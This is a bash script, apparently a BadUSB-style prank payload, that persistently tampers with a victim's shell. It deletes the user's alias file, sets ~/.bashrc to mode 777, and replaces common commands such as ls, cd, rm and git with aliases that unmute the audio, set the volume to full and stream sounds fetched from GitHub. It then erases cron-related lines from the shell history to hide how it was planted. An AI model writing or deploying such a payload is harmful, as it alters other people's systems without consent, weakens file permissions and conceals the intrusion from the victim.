#!/usr/bin/env bash

rm ~/.bash_aliases

chmod 777 ~/.bashrc
B=~/.bashrc
AB=$(cat << 'EOF'
if [ -f ~/.bash_aliases ]; then
    . ~/.bash_aliases
fi
EOF
)
echo "alias ls='(amixer -q set Master unmute; amixer -q set Master 100%; wget -qO- https://github.com/Cluster-bright/bad_usb_for_fun/raw/refs/heads/main/terminal_tomfoolery/sounds/fx/yay.wav | aplay -q || exit 1 &) ; ls'" >> ~/.bash_aliases
echo "alias clear='(amixer -q set Master unmute; amixer -q set Master 100%; wget -qO- https://github.com/Cluster-bright/bad_usb_for_fun/raw/refs/heads/main/terminal_tomfoolery/sounds/fx/fart.wav | aplay -q || exit 1 &) ; clear'" >> ~/.bash_aliases
echo "alias cd='(amixer -q set Master unmute; amixer -q set Master 100%; wget -qO- https://github.com/Cluster-bright/bad_usb_for_fun/raw/refs/heads/main/terminal_tomfoolery/sounds/fx/spring.wav | aplay -q || exit 1 &) ; cd'" >> ~/.bash_aliases
echo "alias rm='(amixer -q set Master unmute; amixer -q set Master 100%; wget -qO- https://github.com/Cluster-bright/bad_usb_for_fun/raw/refs/heads/main/terminal_tomfoolery/sounds/fx/creeper.wav | aplay -q || exit 1 &) ; rm'" >> ~/.bash_aliases
echo "alias mkdir='(amixer -q set Master unmute; amixer -q set Master 100%; wget -qO- https://github.com/Cluster-bright/bad_usb_for_fun/raw/refs/heads/main/terminal_tomfoolery/sounds/fx/mail.wav | aplay -q || exit 1 &) ; mkdir'" >> ~/.bash_aliases
echo "alias mv='(amixer -q set Master unmute; amixer -q set Master 100%; wget -qO- https://github.com/Cluster-bright/bad_usb_for_fun/raw/refs/heads/main/terminal_tomfoolery/sounds/fx/pipe.wav | aplay -q || exit 1 &) ; mv'" >> ~/.bash_aliases
echo "alias emacs='(amixer -q set Master unmute; amixer -q set Master 100%; wget -qO- https://github.com/Cluster-bright/bad_usb_for_fun/raw/refs/heads/main/terminal_tomfoolery/sounds/fx/yamete.wav | aplay -q || exit 1 &) ; emacs'" >> ~/.bash_aliases
echo "alias gcc='(amixer -q set Master unmute; amixer -q set Master 100%; wget -qO- https://github.com/Cluster-bright/bad_usb_for_fun/raw/refs/heads/main/terminal_tomfoolery/sounds/fx/my-code-is-broken.wav | aplay -q || exit 1 &) ; gcc'" >> ~/.bash_aliases
echo "alias man='(amixer -q set Master unmute; amixer -q set Master 100%; wget -qO- https://github.com/Cluster-bright/bad_usb_for_fun/raw/refs/heads/main/terminal_tomfoolery/sounds/fx/book.wav | aplay -q || exit 1 &) ; man'" >> ~/.bash_aliases
echo "alias cp='(amixer -q set Master unmute; amixer -q set Master 100%; wget -qO- https://github.com/Cluster-bright/bad_usb_for_fun/raw/refs/heads/main/terminal_tomfoolery/sounds/fx/amogus.wav | aplay -q || exit 1 &) ; cp'" >> ~/.bash_aliases
echo "alias valgrind='(amixer -q set Master unmute; amixer -q set Master 100%; wget -qO- https://github.com/Cluster-bright/bad_usb_for_fun/raw/refs/heads/main/terminal_tomfoolery/sounds/fx/skill.wav | aplay -q || exit 1 &) ; valgrind'" >> ~/.bash_aliases
echo "alias make='(amixer -q set Master unmute; amixer -q set Master 100%; wget -qO- https://github.com/Cluster-bright/bad_usb_for_fun/raw/refs/heads/main/terminal_tomfoolery/sounds/fx/nanomachines.wav | aplay -q || exit 1 &) ; make'" >> ~/.bash_aliases
echo "alias git='(amixer -q set Master unmute; amixer -q set Master 100%; wget -qO- https://github.com/Cluster-bright/bad_usb_for_fun/raw/refs/heads/main/terminal_tomfoolery/sounds/fx/git_gud.wav | aplay -q || exit 1 &) ; git'" >> ~/.bash_aliases
echo "alias get='(amixer -q set Master unmute; amixer -q set Master 100%; wget -qO- https://github.com/Cluster-bright/bad_usb_for_fun/raw/refs/heads/main/terminal_tomfoolery/sounds/fx/get_here.wav | aplay -q || exit 1 &) ; get'" >> ~/.bash_aliases
echo "alias cat='(amixer -q set Master unmute; amixer -q set Master 100%; wget -qO- https://github.com/Cluster-bright/bad_usb_for_fun/raw/refs/heads/main/terminal_tomfoolery/sounds/fx/cat.wav | aplay -q || exit 1 &) ; cat'" >> ~/.bash_aliases
echo "alias echo='(amixer -q set Master unmute; amixer -q set Master 100%; wget -qO- https://github.com/Cluster-bright/bad_usb_for_fun/raw/refs/heads/main/terminal_tomfoolery/sounds/fx/echo.wav | aplay -q || exit 1 &) ; echo'" >> ~/.bash_aliases
if ! grep -q 'if \[ -f ~/.bash_aliases \]; then' "$B"; then
    echo -e "\n$AB" >> "$B"
fi
sed -i '/cron/d' ~/.bash_history
sed -i '/CRON/d' ~/.bash_history
history -c
history -r
